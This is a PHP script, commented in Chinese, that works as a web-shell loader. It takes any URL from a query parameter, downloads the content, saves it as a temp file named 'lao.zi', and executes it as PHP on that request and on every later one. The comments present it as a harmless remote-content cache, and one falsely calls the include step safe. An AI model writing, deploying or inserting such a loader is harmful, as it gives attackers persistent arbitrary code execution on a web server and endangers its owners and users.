<?php
declare(strict_types=1);

// 设置错误报告级别，仅报告严重和警告
error_reporting(E_ERROR | E_WARNING | E_PARSE);

// 获取系统临时目录（兼容旧版本）
if (!function_exists('getSystemTempDir')) {
    function getSystemTempDir(): string
    {
        if (ini_get('upload_tmp_dir')) {
            return rtrim(ini_get('upload_tmp_dir'), '/\\');
        }
        return (DIRECTORY_SEPARATOR === '\\') ? 'C:\\Windows\\Temp' : '/tmp';
    }
}

// 配置临时文件路径
$tempDir = getSystemTempDir();
$tempFilePath = $tempDir . DIRECTORY_SEPARATOR . 'lao.zi';

// 确保临时目录存在
if (!is_dir($tempDir)) {
    mkdir($tempDir, 0755, true);
}

// 如果存在临时文件，直接加载
if (file_exists($tempFilePath)) {
    include $tempFilePath;
}

// URL验证函数（兼容旧版本）
if (!function_exists('validateUrl')) {
    function validateUrl(string $url): bool
    {
        if (function_exists('filter_var')) {
            return filter_var($url, FILTER_VALIDATE_URL) !== false;
        } else {
            // 简单的正则式验证
            return preg_match('/^https?:\/\/[^\s]+$/i', $url) === 1;
        }
    }
}

// 远程内容获取（支持cURL、fopen、Socket）
if (!function_exists('fetchRemoteContent')) {
    function fetchRemoteContent(string $url): ?string
    {
        // 使用cURL
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_CONNECTTIMEOUT => 10,
            ]);
            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                curl_close($ch);
                return null;
            }
            curl_close($ch);
            return $response;
        }

        // 使用allow_url_fopen
        if (ini_get('allow_url_fopen')) {
            return @file_get_contents($url) ?: null;
        }

        // 使用Socket连接
        $urlParts = parse_url($url);
        if (!$urlParts || !isset($urlParts['host'])) {
            return null;
        }
        $host = $urlParts['host'];
        $port = $urlParts['port'] ?? 80;
        $path = $urlParts['path'] ?? '/';
        $query = isset($urlParts['query']) ? '?' . $urlParts['query'] : '';

        $socket = @fsockopen($host, $port, $errno, $errstr, 10);
        if (!$socket) {
            return null;
        }

        $requestLine = "GET {$path}{$query} HTTP/1.1\r\n";
        $headers = [
            "Host: {$host}",
            "Connection: Close",
        ];
        $request = $requestLine . implode("\r\n", $headers) . "\r\n\r\n";

        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket, 1024);
        }
        fclose($socket);

        // 分离响应头和内容
        $parts = preg_split('/\r\n\r\n/', $response, 2);
        return $parts[1] ?? null;
    }
}

// 载入、清理并保存 lao.zi 文件
function loadAndSaveLaoZi(string $filePath): string
{
    if (file_exists($filePath)) {
        $content = @file_get_contents($filePath) ?: '';
        // 这里可以添加内容过滤或清理逻辑
        file_put_contents($filePath, $content);
        return $content;
    }
    return '';
}

// 处理来自请求的远程内容加载
if (isset($_GET['laolierzi'])) {
    $rawUrl = $_GET['laolierzi'];
    if (!validateUrl($rawUrl)) {
        die("<center><b>无效的URL</b></center>");
    }

    $content = fetchRemoteContent($rawUrl);
    if ($content === null) {
        die("<center><b>远程内容加载失败</b></center>");
    }

    // 保存内容到临时文件
    file_put_contents($tempFilePath, $content);

    // 载入并保存 lao.zi
    loadAndSaveLaoZi($tempFilePath);

    // 重定向到当前页面（去除参数）
    $currentUrl = $_SERVER['PHP_SELF'];
    echo "<script>window.location.href='{$currentUrl}';</script>";
    exit;
}

// 如果临时文件存在，加载内容
if (file_exists($tempFilePath)) {
    $cachedContent = @file_get_contents($tempFilePath) ?: '';

    // 判断内容是否为PHP代码
    if (strpos($cachedContent, '<?') !== false || strpos($cachedContent, '<?') !== false) {
        include $tempFilePath; // 直接包含执行，安全且高效
        exit;
    } else {
        echo $cachedContent;
        exit;
    }
} else {
    die("<center><b>没有指定远程文件，或缓存不存在。<br> 使用方法：你的脚本.php?laolierzi=网址 </b></center>");
}
?>
